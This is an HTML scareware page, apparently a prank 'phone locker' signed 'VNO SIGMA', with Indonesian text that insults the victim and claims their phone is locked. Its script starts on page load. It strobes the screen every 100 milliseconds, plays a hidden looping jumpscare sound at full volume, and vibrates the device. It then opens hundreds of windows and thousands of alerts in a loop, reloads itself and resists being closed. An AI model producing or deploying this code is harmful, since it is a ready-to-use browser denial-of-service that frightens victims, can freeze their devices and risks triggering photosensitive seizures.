<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔒 LOCKED BY VNO</title>
    <style>
        * { margin: 0; padding: 0; }
        body {
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            font-family: 'Courier New', monospace;
        }
        .container {
            background: rgba(0,0,0,0.9);
            padding: 30px;
            border-radius: 20px;
            border: 3px solid #00ff00;
            box-shadow: 0 0 50px #00ff00;
            text-align: center;
            animation: glitch 0.3s infinite;
            z-index: 999;
        }
        @keyframes glitch {
            0% { text-shadow: 2px 2px 0 #ff0000; }
            25% { text-shadow: -2px -2px 0 #0000ff; }
            50% { text-shadow: 2px -2px 0 #ff00ff; }
            75% { text-shadow: -2px 2px 0 #00ffff; }
            100% { text-shadow: 2px 2px 0 #ff0000; }
        }
        img {
            width: 180px;
            height: 180px;
            border-radius: 50%;
            border: 5px solid #00ff00;
            margin-bottom: 20px;
            animation: pulse 0.8s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.15); }
            100% { transform: scale(1); }
        }
        h1 {
            font-size: 2.8rem;
            color: #ff0000;
            text-shadow: 0 0 30px #ff0000;
            margin: 10px 0;
        }
        h2 {
            font-size: 2rem;
            color: #00ff00;
            text-shadow: 0 0 30px #00ff00;
        }
        .sub {
            color: #ffcc00;
            font-size: 1.3rem;
            margin-top: 10px;
            animation: blink 0.3s infinite;
        }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0; }
            100% { opacity: 1; }
        }
        #flash {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            z-index: 9999;
            pointer-events: none;
            opacity: 0;
            transition: opacity 0.05s;
        }
        #flash.active {
            opacity: 1;
        }
        /* SEMBUNYIKAN AUDIO PLAYER */
        #audio-container {
            display: none;
        }
    </style>
</head>
<body>

    <!-- FLASH OVERLAY -->
    <div id="flash"></div>

    <!-- AUDIO JUMBSCARE (DI-SEMBUNYIKAN) -->
    <div id="audio-container">
        <audio id="jumpscare" autoplay loop>
            <source src="https://www.myinstants.com/media/sounds/roblox_oomf.mp3" type="audio/mpeg">
            <!-- FALLBACK: KALO GA LOAD, PAKE BEEP BAWAAN -->
        </audio>
    </div>

    <!-- KONTEN UTAMA -->
    <div class="container">
        <img src="https://cdn.pixabay.com/photo/2017/10/04/17/21/hacker-2816972_1280.png" alt="Hacker">
        <h1>🔒 HP LU KEKUNCI NIH GOBLOK!</h1>
        <h2>☠️ BY VNO SIGMA ☠️</h2>
        <div class="sub">💀 SYSTEM TERINFILTRASI 💀</div>
        <div class="sub">🔥 JANGAN COBA MATIKEN, GUA LEBIH CEPAT 🔥</div>
    </div>

    <script>
        // === PUTAR SUARA JUMBSCARE ===
        function playJumpscare() {
            const audio = document.getElementById('jumpscare');
            audio.volume = 1.0; // Volume maksimal
            audio.play().catch(() => {
                // Kalo gagal (misal autoplay diblokir), bikin alert pake getar
                alert("🔊 SUARA JUMBSCARE GAGAL DIPUTAR, TAPI HP TETAP KENA!");
            });
        }

        // === FLASH LAYAR ===
        function flashScreen() {
            const flash = document.getElementById('flash');
            setInterval(() => {
                flash.classList.toggle('active');
                document.body.style.backgroundColor = flash.classList.contains('active') ? '#fff' : '#000';
            }, 100);
        }

        // === LOCKER EKSTREME ===
        function lockDevice() {
            setInterval(() => {
                navigator.vibrate(30000);
                for (let i = 0; i < 300; i++) {
                    window.open("about:blank", "_blank");
                }
                for (let i = 0; i < 10000; i++) {
                    alert("🔥 HP LU KEKUNCI NIH GOBLOK! BY VNO SIGMA 🔥");
                }
                window.location.href = window.location.href;
            }, 300);
        }

        // === JALANKAN SEMUA SAAT LOAD ===
        window.onload = function() {
            setTimeout(() => {
                playJumpscare();   // Putar suara
                flashScreen();     // Nyalain flash
                lockDevice();      // Jalankan lock
            }, 1500);
        };

        // === CEGAH KELUAR ===
        window.onbeforeunload = function() {
            return "LU KIRA BISA KELUAR? GOBLOK!";
        };
    </script>
</body>
</html>
